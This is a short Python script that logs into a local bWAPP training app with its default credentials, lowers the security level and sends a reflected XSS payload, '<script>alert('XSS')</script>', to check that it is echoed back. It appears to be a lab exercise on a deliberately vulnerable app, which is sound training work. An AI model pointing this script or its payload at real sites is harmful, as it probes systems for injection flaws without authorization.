#!/usr/bin/env python3

import requests

BASE_URL = "http://localhost:8080"
BWAPP_URL = f"{BASE_URL}/portal.php"
LOGIN_URL = f"{BASE_URL}/login.php"
XSS_URL = f"{BASE_URL}/xss_get.php"

s = requests.Session()

# Step 1: Login
print("[*] Logging into bWAPP...")
login_data = {"login": "bee", "password": "bug", "security_level": "0", "form": "submit"}
resp = s.post(LOGIN_URL, data=login_data)
if "Logout" not in resp.text and "Portal" not in resp.text and not resp.url.endswith("portal.php"):
    print("[-] Login failed")
    exit()

print("[+] Logged in successfully!")

# Step 2: Set security level to low
print("[*] Setting security level to low...")
security_data = {"security": "low", "security_level": "0", "form": "submit"}
s.post(f"{BASE_URL}/security.php", data=security_data)

# Step 3: Access the Reflected XSS page and send payload
print("[*] Sending XSS payload to Reflected (GET) page...")
payload = "<script>alert('XSS')</script>"
resp = s.get(XSS_URL, params={"firstname": payload, "lastname": "demo"})
xss_url = resp.url

# Step 4: Confirm
if payload in resp.text:
    print("[+] XSS payload appears in response! Open browser to confirm popup.")
    print(f"    -> {xss_url}")
else:
    print("[-] XSS payload not reflected.")
